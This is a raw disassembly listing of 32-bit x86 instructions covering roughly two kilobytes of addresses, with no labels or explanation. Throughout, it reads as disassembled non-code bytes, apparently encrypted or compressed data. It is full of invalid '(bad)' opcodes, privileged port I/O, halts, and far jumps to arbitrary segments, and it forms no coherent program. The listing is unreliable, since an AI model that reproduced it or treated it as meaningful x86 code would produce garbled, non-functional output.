  40e3ff:	out    dx,eax
  40e400:	xor    BYTE PTR [edi+eiz*8+0x529c385f],0x76
  40e408:	fwait
  40e409:	jbe    0x40e3c8
  40e40b:	cld    
  40e40c:	jmp    0xa45b:0x1978ff03
  40e413:	lock retf 
  40e415:	dec    edi
  40e416:	fild   QWORD PTR [edi-0x7f64df43]
  40e41c:	pop    eax
  40e41d:	sub    DWORD PTR [ebx+edx*4],esi
  40e420:	(bad)  
  40e421:	in     al,dx
  40e422:	jl     0x40e3cf
  40e424:	sbb    BYTE PTR [esi+0x19],bl
  40e427:	dec    edx
  40e428:	inc    eax
  40e429:	aaa    
  40e42a:	jecxz  0x40e416
  40e42c:	mov    BYTE PTR [ebx+0x52d60b14],bl
  40e432:	sub    BYTE PTR [ecx+ecx*1],bl
  40e435:	or     dh,ah
  40e437:	adc    ecx,esp
  40e439:	(bad)  
  40e43a:	cmc    
  40e43b:	js     0x40e3cc
  40e43d:	test   eax,0x838a8037
  40e442:	lods   eax,DWORD PTR ds:[esi]
  40e443:	jge    0x40e3d8
  40e445:	fsubrp st(1),st
  40e447:	mov    esp,0xfca3462d
  40e44c:	or     DWORD PTR [ecx],esp
  40e44e:	(bad)  
  40e44f:	jbe    0x40e473
  40e451:	xchg   ecx,eax
  40e452:	pop    ss
  40e453:	popa   
  40e454:	push   edx
  40e455:	xor    DWORD PTR [esi+0x7c],edx
  40e458:	and    eax,edi
  40e45a:	mov    bl,0x5b
  40e45c:	popa   
  40e45d:	inc    ebx
  40e45e:	(bad)  
  40e45f:	adc    edi,esp
  40e461:	cdq    
  40e462:	dec    esi
  40e463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e465:	ins    DWORD PTR es:[edi],dx
  40e466:	fyl2xp1 
  40e468:	test   ah,ch
  40e46a:	mov    al,ds:0x17474f36
  40e46f:	out    dx,al
  40e470:	dec    edi
  40e471:	(bad)  
  40e472:	clc    
  40e473:	jno    0x40e402
  40e475:	rcl    BYTE PTR [eax-0x69],0x5a
  40e479:	lea    esp,[ebp+0xb]
  40e47c:	pop    edi
  40e47d:	adc    ah,BYTE PTR [edx-0x5155a982]
  40e483:	dec    ebx
  40e484:	push   es
  40e485:	aad    0x1f
  40e487:	inc    ebp
  40e488:	mov    ebx,0x65d78860
  40e48d:	in     eax,0xbe
  40e48f:	or     DWORD PTR ds:0x73db90c4,0x38
  40e496:	mov    bh,0xd8
  40e498:	and    cl,BYTE PTR [esi]
  40e49a:	adc    edi,esi
  40e49c:	pop    ebx
  40e49d:	mov    al,ds:0xa2db4565
  40e4a2:	std    
  40e4a3:	ror    DWORD PTR [eax-0x4fdb08ea],1
  40e4a9:	xchg   DWORD PTR [ebp+0x16],eax
  40e4ac:	enter  0xba3,0xa6
  40e4b0:	cmp    bl,0x60
  40e4b3:	cld    
  40e4b4:	lock mov al,ds:0x62a6d3dd
  40e4ba:	repnz ins BYTE PTR es:[edi],dx
  40e4bc:	dec    esp
  40e4bd:	or     DWORD PTR ds:0x429ab9c9,ecx
  40e4c3:	hlt    
  40e4c4:	lods   al,BYTE PTR ds:[esi]
  40e4c5:	or     ebx,edi
  40e4c7:	mov    WORD PTR [edx+0x6a],ss
  40e4ca:	cld    
  40e4cb:	add    edi,eax
  40e4cd:	jae    0x40e4bb
  40e4cf:	ds aaa 
  40e4d1:	push   0xffffffba
  40e4d3:	addr16 in eax,0xdb
  40e4d6:	rcr    BYTE PTR [ebx-0x64],cl
  40e4d9:	mov    bl,0xa1
  40e4db:	jbe    0x40e551
  40e4dd:	leave  
  40e4de:	retf   0xd571
  40e4e1:	mov    ebx,DWORD PTR [ebx+0x13c84ef4]
  40e4e7:	out    dx,al
  40e4e8:	leave  
  40e4e9:	outs   dx,DWORD PTR ds:[esi]
  40e4ea:	sbb    ecx,DWORD PTR [esi+ebp*1-0x12]
  40e4ee:	mov    cl,0xb7
  40e4f0:	mov    esi,0x603775b1
  40e4f5:	mov    edi,0xd1e8a5ce
  40e4fa:	loopne 0x40e571
  40e4fc:	js     0x40e482
  40e4fe:	mov    ebx,esp
  40e500:	pop    esp
  40e501:	call   0x5c8199e0
  40e506:	jle    0x40e4ec
  40e508:	and    al,0x3d
  40e50a:	lods   eax,DWORD PTR ds:[esi]
  40e50b:	repz pop es
  40e50d:	push   0xffffff8f
  40e50f:	push   ecx
  40e510:	mov    ds:0x9db71d9d,al
  40e515:	jl     0x40e504
  40e517:	(bad)  
  40e518:	mov    WORD PTR [edi-0x7a],?
  40e51b:	cmp    DWORD PTR ds:0x3243ea13,edx
  40e521:	cmp    DWORD PTR [edx+0x7b],ebx
  40e524:	xchg   DWORD PTR [edi],edx
  40e526:	inc    ecx
  40e527:	rcl    BYTE PTR [eax],cl
  40e529:	fcomp  QWORD PTR [edi+0x46]
  40e52c:	push   ss
  40e52d:	fist   WORD PTR [edx+0x56]
  40e530:	call   FWORD PTR [ebp+0x36]
  40e533:	xchg   BYTE PTR [edi-0x152eb95c],cl
  40e539:	pop    ebp
  40e53a:	push   0xffffff9e
  40e53c:	mov    ch,0x2b
  40e53e:	mov    esp,0x7a676f7
  40e543:	adc    BYTE PTR [ebx-0x7d],0x11
  40e547:	int    0x91
  40e549:	sbb    al,0xbf
  40e54b:	call   0x320be46d
  40e550:	inc    eax
  40e551:	add    eax,0x302d6e2f
  40e556:	push   ds
  40e557:	jbe    0x40e529
  40e559:	and    ecx,DWORD PTR [ebp+0x3d]
  40e55c:	mov    ah,al
  40e55e:	dec    edx
  40e55f:	jg     0x40e5a4
  40e561:	inc    ecx
  40e562:	ins    DWORD PTR es:[edi],dx
  40e563:	popf   
  40e564:	pop    esi
  40e565:	cmp    dl,dl
  40e567:	inc    edx
  40e568:	test   al,0xf2
  40e56a:	idiv   DWORD PTR [ebx+edi*1-0x19f0ca25]
  40e571:	inc    ecx
  40e572:	mov    ds,WORD PTR [ecx]
  40e574:	jae    0x40e534
  40e576:	sbb    al,0xee
  40e578:	sbb    BYTE PTR [edi],al
  40e57a:	cdq    
  40e57b:	shl    dl,1
  40e57d:	sbb    ebx,DWORD PTR [esi]
  40e57f:	pushf  
  40e580:	xchg   esp,eax
  40e581:	rol    DWORD PTR [edi+eiz*2],1
  40e584:	out    0xc1,eax
  40e586:	mov    esi,0xd4cfa59e
  40e58b:	xchg   esp,eax
  40e58c:	adc    bl,0x3e
  40e58f:	cwde   
  40e590:	fcom   QWORD PTR [ecx]
  40e592:	jg     0x40e593
  40e594:	popa   
  40e595:	dec    edi
  40e596:	cld    
  40e597:	and    ebp,DWORD PTR [ebp-0x18]
  40e59a:	sbb    ecx,eax
  40e59c:	inc    ebp
  40e59d:	es nop
  40e59f:	inc    eax
  40e5a0:	cs dec esi
  40e5a2:	fsubrp st(6),st
  40e5a4:	cdq    
  40e5a5:	add    eax,0x3bf3e474
  40e5aa:	mov    al,0x15
  40e5ac:	dec    ecx
  40e5ad:	bound  esp,QWORD PTR [eax+0x5dde0063]
  40e5b3:	xchg   edi,eax
  40e5b4:	iret   
  40e5b5:	and    DWORD PTR [ebp-0x1469d1e2],esp
  40e5bb:	push   ss
  40e5bc:	or     BYTE PTR [ebp+eax*8-0x2f],bl
  40e5c0:	loope  0x40e62a
  40e5c2:	dec    edi
  40e5c3:	out    0x52,al
  40e5c5:	sub    bl,BYTE PTR [eax]
  40e5c7:	arpl   WORD PTR [eax],di
  40e5c9:	ss cmp eax,0xcdccd30a
  40e5cf:	(bad)  
  40e5d0:	(bad)  
  40e5d2:	out    dx,eax
  40e5d3:	pop    esi
  40e5d4:	dec    ecx
  40e5d5:	push   ds
  40e5d6:	push   esi
  40e5d7:	and    ecx,edi
  40e5d9:	pop    ss
  40e5da:	cmc    
  40e5db:	ret    
  40e5dc:	pusha  
  40e5dd:	mov    al,ds:0xbf6342d
  40e5e2:	scas   al,BYTE PTR es:[edi]
  40e5e3:	(bad)  
  40e5e4:	fs int3 
  40e5e6:	cmp    al,0xac
  40e5e8:	ss aad 0x2d
  40e5eb:	ss sbb cl,dl
  40e5ee:	dec    esp
  40e5ef:	mov    esp,0x3b770802
  40e5f4:	adc    DWORD PTR [ecx+0x38],edi
  40e5f7:	hlt    
  40e5f8:	and    eax,0x3da08cfd
  40e5fd:	inc    ebp
  40e5fe:	dec    edi
  40e5ff:	jno    0x40e67a
  40e601:	sub    al,0xf6
  40e603:	shl    ebx,0xe3
  40e606:	fidiv  WORD PTR [ecx+0x21be9ce5]
  40e60c:	dec    esi
  40e60d:	xor    edx,DWORD PTR [ebp-0x7b71e5c4]
  40e613:	in     al,dx
  40e614:	push   edx
  40e615:	push   0xffffffb8
  40e617:	loopne 0x40e68d
  40e619:	sub    eax,0x5e78f335
  40e61e:	sti    
  40e61f:	inc    ebx
  40e620:	add    al,0xb4
  40e622:	xchg   esi,eax
  40e623:	test   bh,0xa0
  40e626:	push   esi
  40e627:	fs mov ah,0xa5
  40e62a:	ret    0xc8fa
  40e62d:	mov    bh,0xbb
  40e62f:	inc    eax
  40e630:	sbb    dl,BYTE PTR [esi-0x30]
  40e633:	push   ebx
  40e634:	jmp    0xb358:0xcf8f3ec2
  40e63b:	ss ja  0x40e5d9
  40e63e:	add    BYTE PTR ss:[edi+0x4d],bl
  40e642:	das    
  40e643:	sbb    al,0x38
  40e645:	ret    0xcc89
  40e648:	(bad)  
  40e64a:	cmp    eax,0x2474c169
  40e64f:	stc    
  40e650:	dec    edx
  40e651:	jbe    0x40e6b1
  40e653:	imul   ebp,DWORD PTR [ebx],0xfffffffc
  40e656:	mov    ?,ebx
  40e658:	ja     0x40e60d
  40e65a:	jp     0x40e64a
  40e65c:	pop    eax
  40e65d:	mov    eax,ds:0xa5daa711
  40e662:	xchg   ecx,eax
  40e663:	adc    esp,0x63
  40e666:	cmp    eax,0x7b17396f
  40e66b:	bound  edi,QWORD PTR [ebx+0x5]
  40e66e:	jmp    0xd2b3:0xb78fbac3
  40e675:	in     eax,0xa7
  40e677:	and    ch,ch
  40e679:	call   0xe574:0x76c2036d
  40e680:	arpl   WORD PTR [edx+esi*1],ax
  40e683:	dec    edx
  40e684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e685:	js     0x40e675
  40e687:	pop    edx
  40e688:	mov    ds:0x8ec3b873,al
  40e68d:	stos   BYTE PTR es:[edi],al
  40e68e:	cld    
  40e68f:	adc    bh,bh
  40e691:	inc    eax
  40e692:	dec    eax
  40e693:	test   esi,ecx
  40e695:	pop    eax
  40e696:	adc    ch,BYTE PTR [esi-0x8]
  40e699:	pop    edx
  40e69a:	xor    DWORD PTR [edi-0x4],edi
  40e69d:	dec    esp
  40e69e:	fdivr  DWORD PTR [ecx+0x26]
  40e6a1:	mov    edi,0x74458905
  40e6a6:	data16 or al,0xa7
  40e6a9:	das    
  40e6aa:	xor    eax,0xe7e2c9b
  40e6af:	mov    ebp,0x94424a2f
  40e6b4:	pop    es
  40e6b5:	les    esp,FWORD PTR [esi-0x51]
  40e6b8:	jl     0x40e6f7
  40e6ba:	inc    eax
  40e6bb:	das    
  40e6bc:	aam    0x50
  40e6be:	addr16 pop ss
  40e6c0:	data16 shl BYTE PTR [edi+0x66bd109],0x6f
  40e6c8:	mov    eax,ds:0x571f8b73
  40e6cd:	mov    ds:0xb3e966,eax
  40e6d2:	test   ebp,ebx
  40e6d4:	es push ebx
  40e6d6:	sub    DWORD PTR [eax],0x4c
  40e6d9:	inc    edi
  40e6da:	jle    0x40e698
  40e6dc:	inc    edi
  40e6dd:	xchg   DWORD PTR [eax+edx*4],eax
  40e6e0:	push   es
  40e6e1:	dec    esp
  40e6e2:	inc    eax
  40e6e3:	push   cs
  40e6e4:	retf   0x8b78
  40e6e7:	retf   
  40e6e8:	daa    
  40e6e9:	dec    esp
  40e6ea:	les    esp,FWORD PTR [eax+eiz*1+0x8]
  40e6ee:	sub    DWORD PTR [ebx-0x59],edi
  40e6f1:	mov    esi,0x7ba040c7
  40e6f6:	cli    
  40e6f7:	fnstcw WORD PTR [edi-0x80]
  40e6fa:	mov    edx,0x631128e7
  40e6ff:	out    0xfe,al
  40e701:	cmp    al,0xde
  40e703:	xor    DWORD PTR [ebp-0x5abd0724],ebx
  40e709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e70a:	and    eax,0xeaccd919
  40e70f:	lds    esp,FWORD PTR ds:0x43f2351b
  40e715:	(bad)  
  40e718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e719:	shl    DWORD PTR [edi+0x12],cl
  40e71c:	(bad)  
  40e71d:	pushf  
  40e71e:	in     al,dx
  40e71f:	push   edx
  40e720:	xor    edi,DWORD PTR [ebp+0x3bf5b9c6]
  40e726:	push   edi
  40e727:	sub    ch,BYTE PTR [ebp+0x38]
  40e72a:	arpl   WORD PTR [esp+ebx*8+0x66],ax
  40e72e:	sbb    bl,BYTE PTR [eax+0x4bf8cc49]
  40e734:	sub    eax,0x9e51b42c
  40e739:	add    eax,0x1c17976d
  40e73e:	jbe    0x40e7a8
  40e740:	rcr    BYTE PTR [eax],cl
  40e742:	xchg   edx,eax
  40e743:	scas   al,BYTE PTR es:[edi]
  40e744:	push   eax
  40e745:	test   al,0xe0
  40e747:	sar    bh,0x7b
  40e74a:	repz pop ds
  40e74c:	ror    BYTE PTR [esi+ebp*4-0x58b50a77],0x2a
  40e754:	or     ebx,DWORD PTR [ebp+0x7e]
  40e757:	out    dx,eax
  40e758:	mov    cl,0x53
  40e75a:	dec    eax
  40e75b:	sahf   
  40e75c:	bnd ja 0x40e7be
  40e75f:	outs   dx,BYTE PTR ds:[esi]
  40e760:	mov    ebx,0xd317c6b0
  40e765:	or     esp,edx
  40e767:	cwde   
  40e768:	mov    ecx,0xf55126d4
  40e76d:	fwait
  40e76e:	(bad)  
  40e76f:	aam    0xd5
  40e771:	(bad)  
  40e772:	fnsave ds:0x2bfe16cf
  40e778:	ds xchg ecx,eax
  40e77a:	scas   al,BYTE PTR es:[edi]
  40e77b:	hlt    
  40e77c:	and    dh,BYTE PTR [ebp+0x5f9a719e]
  40e782:	cli    
  40e783:	mov    bh,0xcc
  40e785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e786:	jb     0x40e7c9
  40e788:	pushf  
  40e789:	mov    ch,0x57
  40e78b:	push   esp
  40e78c:	jo     0x40e772
  40e78e:	inc    edi
  40e78f:	js     0x40e74a
  40e791:	mov    dh,0x75
  40e793:	fldcw  WORD PTR [ebp-0xb]
  40e796:	xchg   esp,eax
  40e797:	and    BYTE PTR [esi],cl
  40e799:	dec    edi
  40e79a:	xrelease mov BYTE PTR [eax-0x50481bfc],bh
  40e7a1:	xlat   BYTE PTR ds:[ebx]
  40e7a2:	aam    0xff
  40e7a4:	psadbw xmm3,xmm3
  40e7a8:	hlt    
  40e7a9:	jae    0x40e739
  40e7ab:	retf   
  40e7ac:	or     eax,0x2acb9af
  40e7b1:	loop   0x40e7bb
  40e7b3:	imul   esi,DWORD PTR [ebx+0x403f6e35],0xffffff89
  40e7ba:	sbb    cl,BYTE PTR [edi+0x616f2fa]
  40e7c0:	and    dh,BYTE PTR [ebx*1-0x15624ee5]
  40e7c7:	push   esi
  40e7c8:	and    DWORD PTR [ecx-0x29bd560b],edi
  40e7ce:	dec    esi
  40e7cf:	pop    ds
  40e7d0:	and    dl,BYTE PTR [edx-0x6a]
  40e7d3:	cmp    eax,0x2ae7b7b6
  40e7d8:	ret    
  40e7d9:	adc    eax,0x3a9750b0
  40e7de:	xchg   BYTE PTR [esi-0x6c90b458],bh
  40e7e4:	or     eax,0x790a08f4
  40e7e9:	xor    DWORD PTR [edx],edi
  40e7eb:	leave  
  40e7ec:	pushf  
  40e7ed:	jg     0x40e786
  40e7ef:	or     al,0xa
  40e7f1:	imul   ecx,DWORD PTR [esi+ecx*2],0xffffffc3
  40e7f5:	fld    DWORD PTR [ebp+0x5f78435e]
  40e7fb:	leave  
  40e7fc:	mov    al,0x78
  40e7fe:	enter  0x501f,0x3f
  40e802:	test   BYTE PTR [edx+0x4ee8b31a],ah
  40e808:	pop    edx
  40e809:	js     0x65f64bd4
  40e80f:	dec    ebp
  40e810:	jp     0x40e7d0
  40e812:	sahf   
  40e813:	lods   al,BYTE PTR ds:[esi]
  40e814:	mov    al,0xd7
  40e816:	ja     0x40e859
  40e818:	push   ecx
  40e819:	cmp    DWORD PTR ds:0x42323116,eax
  40e81f:	mov    esp,0xc7cd9b3c
  40e824:	jo     0x40e836
  40e826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e827:	mov    edx,0xf5a6b3d3
  40e82c:	xor    DWORD PTR [ecx-0x728acb32],edi
  40e832:	hlt    
  40e833:	push   ds
  40e834:	xor    ecx,eax
  40e836:	mov    bl,0x16
  40e838:	xchg   esi,eax
  40e839:	lock inc ebp
  40e83b:	in     eax,0xbe
  40e83d:	ret    
  40e83e:	and    dh,0x4e
  40e841:	add    edi,DWORD PTR [eax+0x4cf8a575]
  40e847:	jnp    0x40e7ee
  40e849:	pop    ds
  40e84a:	(bad)  
  40e84b:	mov    ds:0xcd9aeda4,eax
  40e850:	push   ebx
  40e851:	test   eax,0x71af842d
  40e856:	xor    ebx,DWORD PTR [edi+0x31]
  40e859:	mov    edx,0xf91644aa
  40e85e:	pusha  
  40e85f:	add    ecx,DWORD PTR [ecx-0x7dabfeb3]
  40e865:	mov    ecx,0x13a6323a
  40e86a:	push   ds
  40e86b:	je     0x40e8bf
  40e86d:	scas   al,BYTE PTR es:[edi]
  40e86e:	das    
  40e86f:	jbe    0x40e873
  40e871:	iret   
  40e872:	pop    es
  40e873:	mov    bl,BYTE PTR [ebp-0x6c1d32de]
  40e879:	xor    DWORD PTR [esp+edi*4],eax
  40e87c:	push   eax
  40e87d:	rcl    DWORD PTR [esp+edi*2],0xc7
  40e881:	dec    esp
  40e882:	and    BYTE PTR [edi],bh
  40e884:	popf   
  40e885:	mov    ch,0xfa
  40e887:	xlat   BYTE PTR ds:[ebx]
  40e888:	pop    ds
  40e889:	je     0x40e84f
  40e88b:	mov    eax,0x797c46a4
  40e890:	xor    al,0x76
  40e892:	clc    
  40e893:	add    eax,0x807e20a4
  40e898:	in     al,0x49
  40e89a:	in     al,dx
  40e89b:	enter  0x1b0,0x73
  40e89f:	pop    ebp
  40e8a0:	(bad)  
  40e8a2:	and    al,0x34
  40e8a4:	pop    ecx
  40e8a5:	fs inc eax
  40e8a7:	jmp    FWORD PTR [esp+eax*1]
  40e8aa:	ja     0x40e8bb
  40e8ac:	mov    ch,0x6e
  40e8ae:	dec    esi
  40e8af:	cmp    esi,DWORD PTR [ecx-0x64]
  40e8b2:	jge    0x40e91c
  40e8b4:	or     edx,DWORD PTR [ecx-0x65]
  40e8b7:	xchg   esp,eax
  40e8b8:	mov    BYTE PTR [ebp+0xa5dae2b],bl
  40e8be:	iret   
  40e8bf:	and    DWORD PTR [ecx],edi
  40e8c1:	dec    esp
  40e8c2:	jecxz  0x40e887
  40e8c4:	pop    ss
  40e8c5:	xor    edx,ebp
  40e8c7:	fsubp  st(1),st
  40e8c9:	addr16 test eax,0xaf5e89ec
  40e8cf:	popf   
  40e8d0:	mov    bl,0xfd
  40e8d2:	cdq    
  40e8d3:	inc    eax
  40e8d4:	addr16 fdivrp st(4),st
  40e8d7:	mov    ah,0x38
  40e8d9:	dec    eax
  40e8da:	test   DWORD PTR [esi],edx
  40e8dc:	popf   
  40e8dd:	outs   dx,DWORD PTR ds:[esi]
  40e8de:	adc    al,0xce
  40e8e0:	aad    0x37
  40e8e2:	or     eax,0x236fc1c
  40e8e7:	mov    cl,0xa9
  40e8e9:	je     0x40e959
  40e8eb:	icebp  
  40e8ec:	stos   DWORD PTR es:[edi],eax
  40e8ed:	cmp    eax,0x3f7adca7
  40e8f2:	mov    esp,0xa715f2fc
  40e8f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8f8:	clc    
  40e8f9:	cmc    
  40e8fa:	sbb    ebx,esp
  40e8fc:	jns    0x40e957
  40e8fe:	mov    cl,0xe7
  40e900:	cdq    
  40e901:	push   esi
  40e902:	das    
  40e903:	pop    ds
  40e904:	outs   dx,DWORD PTR ds:[esi]
  40e905:	sti    
  40e906:	cmp    BYTE PTR [edx+edx*8],ch
  40e909:	xchg   ebp,eax
  40e90a:	loopne 0x40e94c
  40e90c:	and    bl,BYTE PTR ss:[edi]
  40e90f:	data16 rcr BYTE PTR [ebx+edi*8+0x5f],1
  40e914:	mov    BYTE PTR [edi-0x34],cl
  40e917:	icebp  
  40e918:	loop   0x40e96c
  40e91a:	les    ecx,FWORD PTR [edi+0x67c66537]
  40e920:	into   
  40e921:	aam    0x31
  40e923:	add    ch,BYTE PTR [edx-0x39]
  40e926:	enter  0x4c56,0x95
  40e92a:	mov    eax,ds:0xbdcd9a54
  40e92f:	jge    0x40e9ae
  40e931:	push   ebp
  40e932:	test   al,0x79
  40e934:	adc    al,0x7
  40e936:	mov    edi,0x32b1b848
  40e93b:	push   ecx
  40e93c:	jge    0x40e9a5
  40e93e:	js     0x40e8ee
  40e940:	adc    DWORD PTR [esp+ebp*8-0x70],eax
  40e944:	mov    ebx,0x2611d2a
  40e949:	xchg   DWORD PTR [ebx-0x7d80f077],ecx
  40e94f:	inc    eax
  40e950:	inc    eax
  40e951:	dec    eax
  40e952:	jns    0x40e95c
  40e954:	je     0x40e9ba
  40e956:	inc    ecx
  40e957:	rol    DWORD PTR [eax+0x3bc7c1a1],0x28
  40e95e:	mov    dl,0xea
  40e960:	pop    ds
  40e961:	call   0xb142:0xcedd14b2
  40e968:	jns    0x40e94e
  40e96a:	dec    eax
  40e96b:	daa    
  40e96c:	xor    ecx,DWORD PTR ds:0x6dce3b42
  40e972:	or     al,0x66
  40e974:	in     eax,dx
  40e975:	dec    ecx
  40e976:	cmp    ah,BYTE PTR [esi]
  40e978:	in     eax,dx
  40e979:	jge    0x40e9d3
  40e97b:	shl    DWORD PTR [ecx],0x5a
  40e97e:	fstp   QWORD PTR [ebx-0x466acad1]
  40e984:	mov    edx,0xa73e15cd
  40e989:	dec    ebx
  40e98a:	ret    
  40e98b:	lods   eax,DWORD PTR ds:[esi]
  40e98c:	cmp    cl,BYTE PTR [ecx-0x3886a96e]
  40e992:	sub    DWORD PTR [ecx-0x31],ebx
  40e995:	add    DWORD PTR [esi+ebp*8-0x4cdfd8b0],esi
  40e99c:	add    al,0x9c
  40e99e:	shr    al,0x79
  40e9a1:	shl    cl,1
  40e9a3:	test   BYTE PTR [edx+0x10],dh
  40e9a6:	add    DWORD PTR [edx],esp
  40e9a8:	cmp    eax,0xb230bf8b
  40e9ad:	test   al,0xb
  40e9af:	in     eax,dx
  40e9b0:	ret    0xfa66
  40e9b3:	bound  edx,QWORD PTR [eax]
  40e9b5:	xchg   esp,eax
  40e9b6:	out    dx,eax
  40e9b7:	push   ds
  40e9b8:	arpl   WORD PTR [edi-0x38],bx
  40e9bb:	jns    0x40e97d
  40e9bd:	pop    edx
  40e9be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9bf:	xchg   esi,eax
  40e9c0:	xor    dl,BYTE PTR [ebx+edx*8-0x78]
  40e9c4:	xor    ebp,DWORD PTR [eax+0x5e8eab0d]
  40e9ca:	sar    BYTE PTR [ecx],cl
  40e9cc:	repz gs inc edi
  40e9cf:	jae    0x40e9f6
  40e9d1:	fsubr  DWORD PTR [edi-0x1c701be6]
  40e9d7:	push   0xd13bb449
  40e9dc:	nop
  40e9dd:	xchg   ebp,eax
  40e9de:	mov    ecx,DWORD PTR [edx+0x1d]
  40e9e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9e2:	and    al,0x65
  40e9e4:	(bad)  [ecx-0x6be6a51d]
  40e9ea:	mov    esp,0x79d3bf83
  40e9ef:	cmp    esp,ecx
  40e9f1:	loop   0x40ea5d
  40e9f3:	xchg   esi,eax
  40e9f4:	push   ss
  40e9f5:	jne    0x40e9b6
  40e9f7:	sbb    al,0xc3
  40e9f9:	dec    eax
  40e9fa:	std    
  40e9fb:	repnz mov esi,0xd2ea6c00
  40ea01:	mov    al,0x74
  40ea03:	jle    0x40ea05
  40ea05:	dec    esp
  40ea06:	add    ebp,0x5d
  40ea09:	jecxz  0x40e9c2
  40ea0b:	mov    ds:0x254c3b93,al
  40ea10:	add    ebp,DWORD PTR [esi-0x22]
  40ea13:	jae    0x40e9cf
  40ea15:	mov    al,0x52
  40ea17:	or     DWORD PTR [esi],0x79
  40ea1a:	pop    esp
  40ea1b:	or     ebx,DWORD PTR [ebx-0x48]
  40ea1e:	data16 mov al,ds:0x39c180ad
  40ea24:	out    0x2b,eax
  40ea26:	cdq    
  40ea27:	mov    edi,0xa06a7142
  40ea2c:	inc    edi
  40ea2d:	mov    BYTE PTR [edi],al
  40ea2f:	fstp   DWORD PTR [ebx+0x41]
  40ea32:	leave  
  40ea33:	rcr    BYTE PTR [ebp-0x62],cl
  40ea36:	mov    ds:0x7d6c9c3e,al
  40ea3b:	test   BYTE PTR [ecx+0x59],al
  40ea3e:	test   BYTE PTR ss:[edi+0x34],0x90
  40ea43:	pop    ds
  40ea44:	push   0xffffff9f
  40ea46:	add    DWORD PTR [ebx],edx
  40ea48:	xchg   DWORD PTR [eax-0x144f7e89],eax
  40ea4e:	(bad)  
  40ea4f:	mov    ecx,0xdb08e8f3
  40ea54:	mov    cl,0xb
  40ea56:	out    dx,al
  40ea57:	std    
  40ea58:	jb     0x40ea2e
  40ea5a:	mov    eax,ds:0x71e4e567
  40ea5f:	adc    edi,DWORD PTR [ecx-0x49]
  40ea62:	or     eax,0xdd2d7e85
  40ea67:	cs dec ebx
  40ea69:	push   0x43
  40ea6b:	data16 (bad) 
  40ea6d:	cwde   
  40ea6e:	lods   al,BYTE PTR ds:[esi]
  40ea6f:	out    dx,al
  40ea70:	sahf   
  40ea71:	das    
  40ea72:	xor    eax,0xb1685e68
  40ea77:	lods   al,BYTE PTR ds:[esi]
  40ea78:	dec    ebp
  40ea79:	lods   eax,DWORD PTR ds:[esi]
  40ea7a:	pop    es
  40ea7b:	aaa    
  40ea7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea7d:	inc    esp
  40ea7e:	mov    ebx,0x69b7661
  40ea83:	jmp    0x24e75c07
  40ea88:	sti    
  40ea89:	push   esp
  40ea8a:	scas   eax,DWORD PTR es:[edi]
  40ea8b:	inc    ecx
  40ea8c:	add    DWORD PTR [ebp+0x757a7121],0x2f
  40ea93:	mov    ds:0x16ef3292,al
  40ea98:	adc    al,0xf6
  40ea9a:	inc    esp
  40ea9b:	xlat   BYTE PTR ds:[ebx]
  40ea9c:	scas   al,BYTE PTR es:[edi]
  40ea9d:	es icebp 
  40ea9f:	ja     0x40eaa3
  40eaa1:	outs   dx,DWORD PTR ds:[esi]
  40eaa2:	pop    ds
  40eaa3:	xchg   BYTE PTR [edx+ebx*2],ah
  40eaa6:	dec    edx
  40eaa7:	sbb    DWORD PTR [edi+0x8],0xffffffb4
  40eaab:	mov    DWORD PTR [edi-0x70],esi
  40eaae:	out    dx,eax
  40eaaf:	mov    cl,BYTE PTR [ecx+0x5815cd01]
  40eab5:	and    dh,BYTE PTR [ebx+0x40b917f6]
  40eabb:	mov    ds:0x3467092,al
  40eac0:	sbb    DWORD PTR [edi+0x72],0xffffffab
  40eac4:	adc    ebp,esi
  40eac6:	mov    dh,0xc8
  40eac8:	push   ebp
  40eac9:	das    
  40eaca:	push   es
  40eacb:	pushf  
  40eacc:	jo     0x40ea98
  40eace:	sbb    eax,0x9803e0f6
  40ead3:	imul   edi,ecx,0x908ada92
  40ead9:	mov    ds:0x82034cf2,eax
  40eade:	push   ebp
  40eadf:	mov    WORD PTR [edi],ds
  40eae1:	in     eax,dx
  40eae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eae3:	mov    eax,ds:0x779a7fac
  40eae8:	inc    ebp
  40eae9:	cmp    al,dl
  40eaeb:	rcr    DWORD PTR [ebp-0x1b7f62],0x64
  40eaf2:	jno    0x40eb2f
  40eaf4:	fadd   QWORD PTR [ebx]
  40eaf6:	or     ecx,DWORD PTR [esi+ebp*2+0x1b9f3aaf]
  40eafd:	mov    edx,0x953df6ef
  40eb02:	or     DWORD PTR [ebp+0x1f7dba3],edx
  40eb08:	pmaxsw mm4,QWORD PTR [esi+0x2428b0c6]
  40eb0f:	sti    
  40eb10:	mov    al,ds:0x6a7287a9
  40eb15:	jle    0x40eb65
  40eb17:	push   ebp
  40eb18:	dec    ebx
  40eb19:	mov    ecx,0x80147efe
  40eb1e:	sub    eax,0xde5c3150
  40eb23:	sub    edi,ebx
  40eb25:	pop    es
  40eb26:	pusha  
  40eb27:	in     eax,0x90
  40eb29:	scas   al,BYTE PTR es:[edi]
  40eb2a:	sub    BYTE PTR [edi+0x6bc7db84],ah
  40eb30:	push   es
  40eb31:	cmp    ch,BYTE PTR [ebp+0x533e8ba8]
  40eb37:	xchg   esi,eax
  40eb38:	mov    bl,0xc7
  40eb3a:	rcr    al,1
  40eb3c:	sbb    ecx,DWORD PTR [ecx]
  40eb3e:	iret   
  40eb3f:	jmp    0x40eb5d
  40eb41:	xlat   BYTE PTR ds:[ebx]
  40eb42:	mov    ebp,DWORD PTR [esi]
  40eb44:	hlt    
  40eb45:	or     ecx,DWORD PTR [ebx-0x3c]
  40eb48:	jns    0x40eb09
  40eb4a:	xchg   esp,eax
  40eb4b:	sbb    eax,0x92dae146
  40eb50:	or     eax,0x8dea5d3e
  40eb55:	xor    eax,0xcc5e668b
  40eb5a:	xor    eax,0x5a80cdf3
  40eb5f:	mov    ebx,0xc6a52210
  40eb64:	mov    eax,ds:0xa9366e6
